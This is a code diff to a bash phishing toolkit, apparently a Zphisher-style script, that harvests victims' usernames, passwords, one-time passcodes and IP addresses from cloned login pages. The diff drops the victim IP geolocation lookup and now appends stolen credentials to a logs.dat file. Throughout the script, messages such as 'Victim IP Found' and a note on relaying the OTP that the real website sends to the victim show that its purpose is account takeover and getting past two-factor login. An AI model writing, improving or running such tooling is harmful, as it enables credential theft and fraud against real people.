@@ -26,7 +26,6 @@ RESETBG="$(printf '\e[0m\n')" #Reset background
 pro_dir=$(pwd) #project directory
 server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
-log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
 banner(){
@@ -71,9 +70,6 @@ sbanner(){
 directories(){
 if [[ ! -d ".server" ]]; then
         mkdir -p ".server"
-fi
-if [[ ! -d "logs" ]]; then
-        mkdir -p "logs"
 fi
 if [[ -d ".server/www" ]]; then
         rm -rf ".server/www"
@@ -479,86 +475,12 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	if [ reply_tunnel=1 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		rm -rf .server/www/ip.txt
-	elif [ reply_tunnel=01 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		rm -rf .server/www/ip.txt
-	else
-		ip_details
-		save_ip
-	fi
-}
-save_ip() {
-	cat .server/dumps/space.txt >> ${log_name}.txt
-	cat .server/dumps/space.txt >> ${log_name}.txt
-	cat .server/dumps/line.txt >> ${log_name}.txt
-	cat .server/www/ip.txt >> ${log_name}.txt
-	mv ${log_name}.txt logs/
-	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
-}
-ip_details() {
-	IFS='\n'
-	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
-	IFS=$'\n'
-	iptt=$(sed -n 's/"ip"://p' track.txt)
-
-	if [[ $iptt != "" ]]; then
-		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
-	fi
-	iptype=$(sed -n 's/"type"://p' track.txt)
-	if [[ $iptype != "" ]]; then
-		echo -e "\n${GREEN} IP type: ${NC} $iptype"
-	fi
-	latitude=$(sed -n 's/"latitude"://p' track.txt)
-	if [[ $latitude != "" ]]; then
-		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
-	fi
-	longitude=$(sed -n 's/"longitude"://p' track.txt)
-	if [[ $longitude != "" ]]; then
-		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
-	fi
-	city=$(sed -n 's/"city"://p' /track.txt)
-	if [[ $city != "" ]]; then
-		echo -e "\n${GREEN} City: ${NC} $city"
-	fi
-	isp=$(sed -n 's/"isp"://p' track.txt)
-	if [[ $isp != "" ]]; then
-		echo -e "\n${GREEN} Isp: ${NC} $isp"
-	fi
-	country=$(sed -n 's/"country"://p' track.txt)
-	if [[ $country != "" ]]; then
-		echo -e  "\n${GREEN} Country: ${NC} $country"
-	fi
-	flag=$(sed -n 's/"country_flag"://p' track.txt)
-	if [[ $flag != "" ]]; then
-		echo -e "\n${GREEN} Country flag: ${NC} $flag"
-	fi
-	cap=$(sed -n 's/"country_capital"://p' track.txt)
-	if [[ $cap != "" ]]; then
-		echo -e "\n${GREEN} Country capital: ${NC} $cap"
-	fi
-	phon=$(sed -n 's/"country_phone"://p' track.txt)
-	if [[ $phon != "" ]]; then
-		echo -e "\n${GREEN} Country code: ${NC} $phon"
-	fi
-	continent=$(sed -n 's/"continent"://p' track.txt)
-	if [[ $continent != "" ]]; then
-		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
-	fi
-	ccode=$(sed -n 's/"currency_code"://p' track.txt)
-	if [[ $ccode != "" ]]; then
-		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
-	fi
-	region=$(sed -n 's/"region"://p' track.txt)
-	if [[ $region != "" ]]; then
-		echo -e "\n${GREEN} State: ${NC} $region"
-	fi
-	cat track.txt >> "/logs/${log_name}.txt"
-	rm -rf track.txt
+        echo -ne "\n${BLUE} Saved in : ${ORANGE}ip.txt"
+	cat .server/dumps/space.txt >> logs.dat
+	cat .server/dumps/space.txt >> logs.dat
+	cat .server/dumps/line.txt >> logs.dat
+        cat .server/www/ip.txt >> logs.dat
+	
 }
 
 #Capture data check
@@ -582,30 +504,28 @@ capture_data_check(){
 capture_id() {
 	echo "${RED}"
         cat .server/www/usernames.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> /logs/${log_name}.txt
-        cat .server/www/usernames.txt >> /logs/${log_name}.txt
-	rm -rf .server/www/usernames.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
+	cat .server/dumps/space.txt >> logs.dat
+        cat .server/www/usernames.txt >> logs.dat
 }
 
 ## Get credentials
 capture_pass() {
 	echo "${RED}"
 	cat  .server/www/pass.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> /logs/${log_name}.txt
-        cat .server/www/pass.txt >> /logs/${log_name}.txt
-	rm -rf .server/www/pass.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
+	cat .server/dumps/space.txt >> logs.dat
+        cat .server/www/pass.txt >> logs.dat
+	
 }
 
 ## Get otp
 capture_otp() {
 	echo "${RED}"
         cat  .server/www/otp.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> /logs/${log_name}.txt
-        cat .server/www/otp.txt >> /logs/${log_name}.txt
-	rm -rf .server/www/otp.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
+	cat .server/dumps/space.txt >> logs.dat
+        cat .server/www/otp.txt >> logs.dat
 }
 
 ## Print data no otp
@@ -615,12 +535,15 @@ capture_data_1() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
+                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                         capture_id
 			capture_pass
+                        rm -rf .server/www/usernames.txt
+			rm -rf .server/www/pass.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -634,17 +557,20 @@ capture_data_2() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
+                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
+                        rm -rf .server/www/usernames.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
 			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
                         capture_otp
+                        rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -658,6 +584,7 @@ capture_data_3() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
+                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
@@ -666,10 +593,13 @@ capture_data_3() {
 			capture_pass
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
                         echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
+                        rm -rf .server/www/usernames.txt
+			rm -rf .server/www/pass.txt
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
 			capture_otp
+			rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 		fi
                 sleep 0.75
